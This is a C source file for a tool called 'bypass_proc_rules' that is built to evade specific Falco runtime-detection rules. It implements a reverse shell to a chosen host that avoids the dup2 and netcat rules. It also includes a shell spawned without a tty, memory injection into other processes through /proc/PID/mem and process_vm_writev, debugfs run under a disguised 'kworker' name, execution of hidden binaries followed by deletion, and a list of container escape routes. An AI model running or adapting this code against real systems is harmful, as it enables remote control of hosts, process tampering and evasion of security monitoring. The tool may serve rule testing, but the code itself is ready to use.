#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>
#include <time.h>

static uint8_t *decode_hex(const char *hex, size_t *out_len)
{
    size_t hlen = strlen(hex);
    if (hlen % 2 != 0) { fprintf(stderr, "[-] odd hex length\n"); return NULL; }
    *out_len = hlen / 2;
    uint8_t *buf = malloc(*out_len);
    if (!buf) return NULL;
    for (size_t i = 0; i < *out_len; i++) {
        unsigned b;
        sscanf(hex + i*2, "%02x", &b);
        buf[i] = (uint8_t)b;
    }
    return buf;
}

static void cmd_reverse_shell(const char *host, const char *port_str)
{

    int port = atoi(port_str);
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) { perror("socket"); return; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);

    struct hostent *he = gethostbyname(host);
    if (!he) { fprintf(stderr, "[-] resolve failed: %s\n", host); close(sockfd); return; }
    memcpy(&sa.sin_addr, he->h_addr_list[0], (size_t)he->h_length);

    fprintf(stderr,
        "[*] reverse-shell: connecting to %s:%d\n"
        "[*] proc.name='bypass_proc_rules' - 'Netcat RCE' rule needs nc/ncat\n"
        "[*] using fcntl(F_DUPFD) instead of dup2 - 'Redirect STDIN/STDOUT' rule bypassed\n",
        host, port);

    if (connect(sockfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect"); close(sockfd); return;
    }
    fprintf(stderr, "[+] connected\n");

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); close(sockfd); return; }

    if (pid == 0) {

        close(0); fcntl(sockfd, F_DUPFD, 0);
        close(1); fcntl(sockfd, F_DUPFD, 1);
        close(2); fcntl(sockfd, F_DUPFD, 2);
        close(sockfd);

        char *sh_argv[] = { "/bin/sh", "-i", NULL };
        extern char **environ;
        execve("/bin/sh", sh_argv, environ);
        _exit(1);
    }
    close(sockfd);
    int st; waitpid(pid, &st, 0);
    fprintf(stderr, "[+] shell session ended (status=%d)\n", WEXITSTATUS(st));
}

static void cmd_dup_safe(const char *host, const char *port_str)
{
    fprintf(stderr,
        "[*] dup-safe: demonstrates fcntl(F_DUPFD) vs dup2 for rule [15]\n"
        "[*] 'Redirect STDOUT/STDIN' condition: dup AND evt.rawres in (0,1,2)\n"
        "[*] dup macro = evt.type in (dup,dup2,dup3); fcntl uses evt.type=fcntl\n"
        "[*] calling reverse-shell with fcntl method...\n");
    cmd_reverse_shell(host, port_str);
}

static void cmd_shell_notty(void)
{

    fprintf(stderr,
        "[*] shell-notty: setsid() before exec → proc.tty = 0\n"
        "[*] 'Terminal shell in container' requires proc.tty != 0 → won't fire\n"
        "[*] also spawning python3 (not in shell_binaries list)\n");

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        char *argv[] = { "python3", "-c",
            "import os,pty; pty.spawn(['/bin/sh'])", NULL };
        extern char **environ;
        execvp("python3", argv);

        char *sh[] = { "/bin/sh", NULL };
        execve("/bin/sh", sh, environ);
        _exit(1);
    }
    if (pid > 0) {
        int st; waitpid(pid, &st, 0);
        fprintf(stderr, "[+] shell exited (status=%d)\n", WEXITSTATUS(st));
    }
}

static void cmd_anti_debug(void)
{

    printf("[*] anti-debug: detecting debugger without PTRACE_TRACEME\n\n");

    {
        FILE *f = fopen("/proc/self/status", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "TracerPid:", 10) == 0) {
                    int tracer = atoi(line + 10);
                    printf("[1] TracerPid = %d → %s\n", tracer,
                           tracer ? "BEING TRACED" : "not traced");
                    break;
                }
            }
            fclose(f);
        }
    }

    {
        int ppid = (int)getppid();
        char path[64]; snprintf(path, sizeof(path), "/proc/%d/comm", ppid);
        FILE *f = fopen(path, "r");
        char comm[32] = "?";
        if (f) { fgets(comm, sizeof(comm), f); fclose(f); }
        comm[strcspn(comm, "\n")] = '\0';
        int dbg = strstr(comm,"gdb") || strstr(comm,"strace") ||
                  strstr(comm,"ltrace") || strstr(comm,"lldb") ||
                  strstr(comm,"valgrind");
        printf("[2] parent comm (pid %d) = '%s'%s\n", ppid, comm,
               dbg ? " [!] DEBUGGER" : "");
    }

    {
        int count = 0;
        DIR *d = opendir("/proc/self/fd");
        if (d) {
            struct dirent *e;
            while ((e = readdir(d))) count++;
            closedir(d);
            count -= 2;
        }
        printf("[3] /proc/self/fd count = %d (%s)\n", count,
               count > 6 ? "elevated - possible debugger" : "normal");
    }

    {
        struct timespec t1, t2;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        volatile long x = 0;
        for (long i = 0; i < 5000000L; i++) x += i;
        clock_gettime(CLOCK_MONOTONIC, &t2);
        long ns = (t2.tv_sec - t1.tv_sec) * 1000000000L + (t2.tv_nsec - t1.tv_nsec);
        printf("[4] tight loop: %ld ms (%s)\n", ns / 1000000,
               ns > 200000000L ? "SLOW - single-stepping?" : "normal");
    }

    {
        char exe[256] = {};
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe)-1);
        if (n > 0) exe[n] = '\0';

        int memfd = strncmp(exe, "/memfd:", 7) == 0;
        printf("[5] proc.exe = %s%s\n", exe,
               memfd ? " [!] running from memfd" : "");
    }

    printf("\n[*] no ptrace syscall used → rule 'PTRACE anti-debug attempt' did NOT fire\n");
}

static void cmd_proc_inject(const char *pid_str, const char *addr_hex, const char *hex_bytes)
{

    pid_t target = (pid_t)atoi(pid_str);
    uintptr_t addr = (uintptr_t)strtoull(addr_hex, NULL, 16);
    size_t dlen;
    uint8_t *data = decode_hex(hex_bytes, &dlen);
    if (!data) return;

    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", (int)target);

    fprintf(stderr,
        "[*] proc-inject: writing %zu bytes to pid %d @ 0x%lx via %s\n"
        "[*] no ptrace syscall → 'PTRACE attached to process' rule won't fire\n",
        dlen, (int)target, (unsigned long)addr, mem_path);

    int fd = open(mem_path, O_RDWR);
    if (fd < 0) { perror(mem_path); free(data); return; }

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        perror("lseek"); close(fd); free(data); return;
    }
    ssize_t n = write(fd, data, dlen);
    if (n < 0) perror("write");
    else fprintf(stderr, "[+] wrote %zd bytes\n", n);

    close(fd);
    free(data);
}

static void cmd_vm_write(const char *pid_str, const char *addr_hex, const char *hex_bytes)
{

    pid_t target = (pid_t)atoi(pid_str);
    uintptr_t addr = (uintptr_t)strtoull(addr_hex, NULL, 16);
    size_t dlen;
    uint8_t *data = decode_hex(hex_bytes, &dlen);
    if (!data) return;

    fprintf(stderr,
        "[*] vm-write: process_vm_writev to pid %d @ 0x%lx (%zu bytes)\n"
        "[*] SYS_process_vm_writev - no ptrace syscall → rule [19] won't fire\n",
        (int)target, (unsigned long)addr, dlen);

    struct iovec local[1], remote[1];
    local[0].iov_base  = data;
    local[0].iov_len   = dlen;
    remote[0].iov_base = (void *)addr;
    remote[0].iov_len  = dlen;

    ssize_t n = syscall(SYS_process_vm_writev, target, local, 1UL, remote, 1UL, 0UL);
    if (n < 0) perror("process_vm_writev");
    else fprintf(stderr, "[+] wrote %zd bytes\n", n);

    free(data);
}

static void cmd_debugfs_proxy(char *const args[], int nargs)
{

    const char *debugfs_paths[] = {
        "/usr/sbin/debugfs", "/sbin/debugfs", "/bin/debugfs", NULL
    };

    const char *dbgfs = NULL;
    for (int i = 0; debugfs_paths[i]; i++) {
        if (access(debugfs_paths[i], X_OK) == 0) { dbgfs = debugfs_paths[i]; break; }
    }
    if (!dbgfs) { fprintf(stderr, "[-] debugfs not found\n"); return; }

    char **argv = calloc((size_t)(nargs + 2), sizeof(char *));
    argv[0] = "kworker";
    for (int i = 0; i < nargs; i++) argv[i+1] = args[i];
    argv[nargs+1] = NULL;

    fprintf(stderr,
        "[*] debugfs-proxy: exec '%s' as argv[0]='kworker'\n"
        "[*] proc.name = 'kworker' → 'Debugfs in Privileged Container' rule won't fire\n",
        dbgfs);

    extern char **environ;
    execve(dbgfs, argv, environ);
    perror("execve");
    free(argv);
}

static void cmd_run_safe(const char *elf_path, char *const extra[], int nextra)
{

    uid_t uid = getuid();
    const char *base = strrchr(elf_path, '/') ? strrchr(elf_path,'/')+1 : elf_path;
    char dst[256];

    snprintf(dst, sizeof(dst), "/run/user/%u/.%s", (unsigned)uid, base);
    if (access("/run/user", F_OK) != 0)
        snprintf(dst, sizeof(dst), "/tmp/.%s", base);

    fprintf(stderr,
        "[*] run-safe: copying '%s' to '%s'\n"
        "[*] not '/dev/shm/*' → 'Execution from /dev/shm' rule won't fire\n",
        elf_path, dst);

    int src = open(elf_path, O_RDONLY);
    if (src < 0) { perror(elf_path); return; }
    struct stat st; fstat(src, &st);
    int dfd = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0700);
    if (dfd < 0) { perror(dst); close(src); return; }
    off_t off = 0; ssize_t rem = st.st_size;
    while (rem > 0) {
        ssize_t n = sendfile(dfd, src, &off, (size_t)rem);
        if (n <= 0) break;
        rem -= n;
    }
    close(src); close(dfd);
    chmod(dst, 0700);

    char **argv = calloc((size_t)(nextra + 2), sizeof(char *));
    argv[0] = dst;
    for (int i = 0; i < nextra; i++) argv[i+1] = extra[i];
    argv[nextra+1] = NULL;

    pid_t pid = fork();
    if (pid == 0) {
        extern char **environ;
        execve(dst, argv, environ);
        _exit(1);
    }
    free(argv);
    int status; waitpid(pid, &status, 0);
    unlink(dst);
    fprintf(stderr, "[+] exited %d; '%s' removed\n", WEXITSTATUS(status), dst);
}

static void cmd_ssh_port_check(void)
{
    static const int flagged[] = { 80, 8080, 88, 443, 8443, 53, 4444, 0 };

    printf("[*] 'Disallowed SSH Connection Non Standard Port' flagged ports:\n");
    printf("    fd.sport (destination port) in: ");
    for (int i = 0; flagged[i]; i++) printf("%d ", flagged[i]);
    printf("\n\n");
    printf("[*] rule fires when: proc.exe endswith 'ssh' AND TCP AND dst_port in list\n");
    printf("[*] BYPASS options:\n");
    printf("    1. Use port 22 or any port NOT in the list above\n");
    printf("    2. Use this tool (reverse-shell) - proc.exe does not end with 'ssh'\n");
    printf("    3. Use SSH over port 2222, 8022, 8222, etc. (not in list)\n");
    printf("    4. Tunnel SSH through a proxy that doesn't use the ssh binary\n");
    printf("\n[*] common safe ports: 22, 2222, 2200, 8022, 9022, 10022, ...\n");
}

static void cmd_cgroup_escape_info(void)
{
    printf("[*] 'Detect release_agent File Container Escapes' bypass options:\n\n");
    printf("  [A] io_uring write: IORING_OP_OPENAT + IORING_OP_WRITE to release_agent\n");
    printf("      No openat syscall → open_write macro never fires → rule silent.\n");
    printf("      See: io_uring_falco write /sys/fs/cgroup/../release_agent\n\n");
    printf("  [B] setns() escape via /proc/1/ns (requires --pid=host on container):\n");
    printf("      setns(/proc/1/ns/mnt) + setns(/proc/1/ns/net) to enter host namespaces.\n");
    printf("      Note: without --pid=host, PID 1 is the container init - setns is a no-op.\n\n");
    printf("  [C] Overlayfs escape (no cgroups):\n");
    printf("      Mount host overlayfs upper dir, write to host path directly.\n");
    printf("      Requires: CAP_SYS_ADMIN in host ns.\n\n");
    printf("  [D] runc binary overwrite (CVE-2019-5736):\n");
    printf("      Open /proc/self/exe while runc is executing, overwrite runc binary.\n");
    printf("      No write to release_agent - entirely different escape vector.\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "bypass_proc_rules - evade Falco process/network/ptrace rules\n\n"
            "usage:\n"
            "  %s reverse-shell <host> <port>          [8][15] C reverse shell (no nc/ncat)\n"
            "  %s dup-safe <host> <port>                [15] stdio redirect via fcntl(F_DUPFD)\n"
            "  %s shell-notty                           [6]  setsid → proc.tty=0\n"
            "  %s anti-debug                            [20] debugger detect without PTRACE_TRACEME\n"
            "  %s proc-inject <pid> <addr> <hexbytes>  [19] inject via /proc/PID/mem\n"
            "  %s vm-write    <pid> <addr> <hexbytes>  [19] inject via process_vm_writev\n"
            "  %s debugfs-proxy [debugfs-args...]       [17] exec debugfs with different comm\n"
            "  %s run-safe <elf> [args...]              [22] exec ELF from /run/user (not /dev/shm)\n"
            "  %s ssh-port-check                        [24] show flagged vs safe SSH ports\n"
            "  %s cgroup-escape-info                   [18] describe release_agent escape alternatives\n"
            "\nrule numbers reference falco_rules.yaml\n"
            "requires: root for proc-inject/vm-write (CAP_SYS_PTRACE or same-uid)\n",
            argv[0], argv[0], argv[0], argv[0], argv[0],
            argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if      (strcmp(argv[1], "reverse-shell")    == 0 && argc >= 4) cmd_reverse_shell(argv[2], argv[3]);
    else if (strcmp(argv[1], "dup-safe")         == 0 && argc >= 4) cmd_dup_safe(argv[2], argv[3]);
    else if (strcmp(argv[1], "shell-notty")      == 0)              cmd_shell_notty();
    else if (strcmp(argv[1], "anti-debug")       == 0)              cmd_anti_debug();
    else if (strcmp(argv[1], "proc-inject")      == 0 && argc >= 5) cmd_proc_inject(argv[2], argv[3], argv[4]);
    else if (strcmp(argv[1], "vm-write")         == 0 && argc >= 5) cmd_vm_write(argv[2], argv[3], argv[4]);
    else if (strcmp(argv[1], "debugfs-proxy")    == 0)              cmd_debugfs_proxy(argv + 2, argc - 2);
    else if (strcmp(argv[1], "run-safe")         == 0 && argc >= 3) cmd_run_safe(argv[2], argv + 3, argc - 3);
    else if (strcmp(argv[1], "ssh-port-check")   == 0)              cmd_ssh_port_check();
    else if (strcmp(argv[1], "cgroup-escape-info")==0)              cmd_cgroup_escape_info();
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
